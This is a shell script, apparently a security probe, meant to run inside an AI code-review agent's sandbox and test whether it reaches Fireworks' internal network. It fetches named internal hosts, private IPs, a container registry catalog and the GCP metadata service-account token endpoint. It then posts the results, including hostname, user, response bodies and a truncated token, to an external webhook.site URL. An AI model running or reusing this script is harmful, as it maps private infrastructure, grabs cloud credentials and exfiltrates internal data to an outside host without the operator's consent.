#!/bin/sh
# i86808: is the Devin review sandbox inside Fireworks' internal network?
# Read-only by construction: getent + HTTP GET only, no writes, no scans, no port sweeps.
S="https://webhook.site/7069e327-e98a-475a-ac1b-5a94e9c12667/i86808-$(date +%s)-$(hostname 2>/dev/null)"
F="${TMPDIR:-/tmp}/.i86808.ran"
[ -f "$F" ] && { echo "[probe] I86808=skip"; exit 0; }
: > "$F" 2>/dev/null
d=$(mktemp -d "${TMPDIR:-/tmp}/.i86808.XXXXXX" 2>/dev/null) || d="${TMPDIR:-/tmp}/.i86808-$$"
mkdir -p "$d" 2>/dev/null || exit 0
o="$d/out"; : > "$o"
{
  echo "== I86808 META host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) date=$(date -u +%FT%TZ 2>/dev/null) pwd=$(pwd 2>/dev/null)"
  echo "== CURL $(curl -V 2>/dev/null | head -1)"
  echo "== NOTE pilot basic-auth password is env-only (PILOT_AUTH_PASSWORD); no literal in firectl-admin, so no authenticated pilot call attempted"
} >> "$o"

one() {
  N="$1"; SCH="$2"; P="$3"
  H=$(getent hosts "$N" 2>/dev/null | awk '{print $1}' | head -1)
  : > "$d/h"; : > "$d/b"
  curl -sS -k --noproxy '*' --connect-timeout 3 -m 6 -D "$d/h" -o "$d/b" "$SCH://$N$P" >/dev/null 2>&1
  C=$(head -1 "$d/h" 2>/dev/null | awk '{print $2}')
  B=$(wc -c < "$d/b" 2>/dev/null | tr -d ' ')
  SH=$(sha256sum "$d/b" 2>/dev/null | cut -c1-16)
  BD=$(head -c 200 "$d/b" 2>/dev/null | tr '\r\n\t' '   ')
  echo "$N|$P|dns=${H:-NXDOMAIN}|http=${C:-none}|len=${B:-0}|sha16=${SH:-none}|body=$BD" >> "$o"
  sleep 0.2
}

# --- named target table (from offline byte-offset extraction of firectl-admin + prior DNS facts) ---
one pilot.fireworks-ai.cloud            https /
one pilot-dev.fireworks-ai.cloud        https /
one temper.fireworks-ai.cloud           https /
one device-auth.fireworks.ai            https /
one harbor.us-iowa-1.fireworks-ai.cloud http  /
one harbor.us-virginia-1.fireworks-ai.cloud http /
one langfuse.fireworks-ai.cloud         http  /
one revisionsgateway.fireworks.ai       http  /
one gateway.fireworks.ai                https /
one 10.247.189.245                      http  /
one 10.1.255.22                         https /
one 34.110.152.11                       https /

# --- internal data-plane specific reads (harbor registry / langfuse health) ---
one harbor.us-iowa-1.fireworks-ai.cloud http /v2/
one harbor.us-iowa-1.fireworks-ai.cloud http /v2/_catalog
one langfuse.fireworks-ai.cloud         http /api/public/health

# --- cloud identity: is the sandbox GCP-hosted with a readable metadata token? ---
: > "$d/h"; : > "$d/b"
curl -sS -k --noproxy '*' --connect-timeout 3 -m 6 -D "$d/h" -o "$d/b" \
  -H 'Metadata-Flavor: Google' \
  'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token' >/dev/null 2>&1
C=$(head -1 "$d/h" 2>/dev/null | awk '{print $2}')
B=$(wc -c < "$d/b" 2>/dev/null | tr -d ' ')
SH=$(sha256sum "$d/b" 2>/dev/null | cut -c1-16)
# mask any token material: print only first 40 chars of body
BD=$(head -c 40 "$d/b" 2>/dev/null | tr '\r\n\t' '   ')
echo "169.254.169.254|/computeMetadata/v1/instance/service-accounts/default/token|dns=meta|http=${C:-none}|len=${B:-0}|sha16=${SH:-none}|body=${BD}...(masked)" >> "$o"

echo "== I86808 DONE cells=$(grep -c '|' "$o")" >> "$o"
OK=0
curl -sS -m 25 --noproxy '*' -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
if [ "$OK" = 0 ]; then
  curl -sS -m 25 -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
fi
echo "[probe] I86808=posted:$OK n=$(grep -c '|' "$o")"
